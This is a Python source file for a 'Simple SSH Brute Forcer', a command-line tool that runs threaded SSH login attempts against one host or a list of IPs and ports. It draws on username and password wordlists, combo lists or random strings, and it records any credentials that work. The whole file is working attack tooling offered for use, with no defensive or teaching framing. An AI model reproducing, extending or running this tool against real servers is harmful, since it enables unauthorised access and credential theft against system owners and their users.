
import random
import sys
from optparse import OptionParser

import Util
from Connection import Connection


class SSHBruteForce():
    def __init__(self):
        self.info = "Simple SSH Brute Forcer"
        self.targetIp = ""
        self.targetPort = 0
        self.targets = []
        self.usernames = []
        self.passwords = []
        self.connections = []
        self.amountOfThreads = 0
        self.currentThreadCount = 0
        self.timeoutTime = 0
        self.outputFileName = None
        self.singleMode = False
        self.verbose = False
        self.bruteForceLength = 0
        self.bruteForceAttempts = 0
        self.bruteForceMode = False
        self.characters = "abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    def startUp(self):
        usage = '{} [-i targetIp] [-U usernamesFile] [-P passwordsFile]'.format(sys.argv[0])

        optionParser = OptionParser(version=self.info, usage=usage)

        optionParser.add_option('-i', dest='targetIp',
                                help='Ip to attack')
        optionParser.add_option('-p', dest='targetPort',
                                help='Ip port to attack', default=22)
        optionParser.add_option('-d', dest='typeOfAttack',
                                help='Dictionary Attack', default=False)
        optionParser.add_option('-a', dest='attemptAmount',
                                help="Number of attempts before stopping", default=2)
        optionParser.add_option('-l', dest='lengthLimit',
                                help='Length of bruteforce strings', default=8)
        optionParser.add_option('-I', dest='targetsFile',
                                help='List of IP\'s and ports')
        optionParser.add_option('-C', dest='combolistFile',
                                help='Combo List file')
        optionParser.add_option('-U', dest='usernamesFile',
                                help='Username List file')
        optionParser.add_option('-P', dest='passwordsFile',
                                help='Password List file')
        optionParser.add_option('-t', type='int', dest='threads',
                                help='Amount of Threads', default=10)
        optionParser.add_option('-T', type='int', dest='timeout',
                                help='Timeout Time', default=15)
        optionParser.add_option('-O', dest="outputFile",
                                help='Output File Name', default=None)
        optionParser.add_option('-v', '--verbose', action='store_true',
                                dest='verbose', help='verbose')

        (options, args) = optionParser.parse_args()

        # First a check is used to see if there is at least a singleIp set or a targetList set
        if not options.targetIp and not options.targetsFile:
            optionParser.print_help()
            sys.exit(1)

        else:
            # Check to see if we are running a dictionary attack or a bruteforce
            if bool(options.typeOfAttack) == True:
                # Then another check to make sure the Username list and passwordlist are filled
                if (options.usernamesFile and options.passwordsFile) or options.combolistFile:
                    # Then we check if it is a single ip only
                    if options.targetIp and not options.targetsFile:
                        self.singleMode = True
                        self.singleTarget(options)
                    elif not options.targetIp and options.targetsFile:
                        self.multipleTargets(options)
                    else:
                        optionParser.print_help()
                        sys.exit(1)
                else:
                    optionParser.print_help()
                    sys.exit(1)
            else:
                # setup the brtue force
                self.bruteForceMode = True
                # Then we check if it is a single ip only
                if options.targetIp and not options.targetsFile:
                    self.singleMode = True
                    self.singleTarget(options)
                elif not options.targetIp and options.targetsFile:
                    self.multipleTargets(options)
                else:
                    optionParser.print_help()
                    sys.exit(1)

    def singleTarget(self, options):
        self.targetIp = options.targetIp
        self.targetPort = options.targetPort
        self.amountOfThreads = options.threads
        self.timeoutTime = options.timeout
        self.outputFileName = options.outputFile
        self.verbose = options.verbose
        self.bruteForceLength = options.lengthLimit
        self.bruteForceAttempts = options.attemptAmount

        if bool(options.typeOfAttack):
            if options.combolistFile:
                self.usernames, self.passwords = self.__seperateDataFromComboList(options.combolistFile)
            else:
                self.usernames = Util.fileContentsToList(options.usernamesFile)
                self.passwords = Util.fileContentsToList(options.passwordsFile)
            self.showStartInfo()
            self.dictionaryAttackSingle()
        else:
            self.showStartInfo()
            self.bruteForceSingle()

    def multipleTargets(self, options):
        self.targets = Util.fileContentsToTuple(options.targetsFile)
        self.amountOfThreads = options.threads
        self.timeoutTime = options.timeout
        self.outputFileName = options.outputFile
        self.verbose = options.verbose
        self.bruteForceLength = options.lengthLimit
        self.bruteForceAttempts = options.attemptAmount

        if bool(options.typeOfAttack):
            if options.combolistFile:
                self.usernames, self.passwords = self.__seperateDataFromComboList(options.combolistFile)
            else:
                self.usernames = Util.fileContentsToList(options.usernamesFile)
                self.passwords = Util.fileContentsToList(options.passwordsFile)
            self.showStartInfo()
            self.dictionaryAttackMultiple()
        else:
            self.showStartInfo()
            self.bruteForceMultiple()

    @staticmethod
    def __seperateDataFromComboList(comboListFile):
        usernames = []
        passwords = []
        for t in Util.fileContentsToTuple(comboListFile):
            usernames.append(t[0])
            passwords.append(t[1])
        return usernames, passwords

    def showStartInfo(self):
        print("[*] {} ".format(self.info))
        if self.singleMode:
            print("[*] Brute Forcing {}".format(self.targetIp))
        else:
            print("[*] Loaded {} Targets ".format(str(len(self.targets))))

        if self.bruteForceMode == False:
            print("[*] Loaded {} Usernames ".format(str(len(self.usernames))))
            print("[*] Loaded {} Passwords ".format(str(len(self.passwords))))
        print("[*] Brute Force Starting ")

        if self.outputFileName is not None:
            Util.appendLineToFile("{}".format(self.info), self.outputFileName)
            if self.singleMode:
                Util.appendLineToFile("Brute Forcing {} ".format(self.targetIp, self.outputFileName))
            else:
                Util.appendLineToFile("Loaded {} Targets ".format(len(self.targets)), self.outputFileName)
            Util.appendLineToFile("Loaded {} Usernames ".format(len(self.usernames)), self.outputFileName)
            Util.appendLineToFile("Loaded {} Passwords ".format(len(self.passwords)), self.outputFileName)
            Util.appendLineToFile("Brute Force Starting ", self.outputFileName)

    def dictionaryAttackSingle(self):
        for username in self.usernames:
            for password in self.passwords:

                self.createConnection(username, password, self.targetIp,
                                      self.targetPort, self.timeoutTime)
                if self.currentThreadCount == self.amountOfThreads:
                    self.currentThreadResults()
        self.currentThreadResults()

    def dictionaryAttackMultiple(self):
        for target in self.targets:
            for username in self.usernames:
                for password in self.passwords:
                    self.createConnection(username, password, target[0],
                                          int(target[1]), self.timeoutTime)
                    if self.currentThreadCount == self.amountOfThreads:
                        self.currentThreadResults()
        self.currentThreadResults()

    def bruteForceSingle(self):
        for x in range(int(self.bruteForceAttempts)):
            randomUserString = ""
            randomPasswordString = ""
            randomStringLength = random.randint(4, int(self.bruteForceLength))
            for y in range(randomStringLength):
                randomUserString = randomUserString + random.choice(self.characters)

            randomStringLength = random.randint(4, int(self.bruteForceLength))

            for z in range(randomStringLength):
                randomPasswordString = randomPasswordString + random.choice(self.characters)

            self.createConnection(randomUserString, randomPasswordString, self.targetIp,
                                  self.targetPort, self.timeoutTime)
            if self.currentThreadCount == self.amountOfThreads:
                self.currentThreadResults()
        self.currentThreadResults()

    def bruteForceMultiple(self):
        for target in self.targets:
            for x in range(self.bruteForceAttempts):
                randomUserString = ""
                randomPasswordString = ""
                randomStringLength = random.randint(4, self.bruteForceLength)

                for y in range(randomStringLength):
                    randomUserString = randomUserString + random.choice(self.characters)

                randomStringLength = random.randint(4, self.bruteForceLength)

                for z in range(randomStringLength):
                    randomPasswordString = randomPasswordString + random.choice(self.characters)

                self.createConnection(randomUserString, randomPasswordString, target,
                                      self.targetPort, self.timeoutTime)
                if self.currentThreadCount == self.amountOfThreads:
                    self.currentThreadResults()

        self.currentThreadResults()

    def createConnection(self, username, password, targetIp, targetPort, timeoutTime):
        connection = Connection(username, password, targetIp, targetPort, timeoutTime)
        connection.start()

        self.connections.append(connection)
        self.currentThreadCount += 1
        if self.verbose:
            print("[*] Adding Target: {0}, Testing with username: {1}, testing with password: {2}".format(targetIp,
                                                                                                          username,
                                                                                                          password))

    def currentThreadResults(self):
        for connection in self.connections:
            connection.join()

            if connection.status == 'Succeeded':
                print("[#] TargetIp: {} ".format(connection.targetIp))
                print("[#] Username: {} ".format(connection.username))
                print("[#] Password: {} ".format(connection.password))

                if self.outputFileName is not None:
                    
                    Util.appendLineToFile("TargetIp: {} ".format(connection.targetIp), self.outputFileName)
                    Util.appendLineToFile("Username: {} ".format(connection.username), self.outputFileName)
                    Util.appendLineToFile("Password: {} ".format(connection.password), self.outputFileName)

                if self.singleMode:
                    self.completed()
            else:
                pass

        self.clearOldThreads()

    def clearOldThreads(self):
        self.connections = []
        self.threadCount = 0

    def completed(self):
        print("[*] Completed Brute Force.")
        sys.exit(0)


if __name__ == '__main__':
    sshBruteForce = SSHBruteForce()
    sshBruteForce.startUp()
    print("[*] Brute Force Completed")
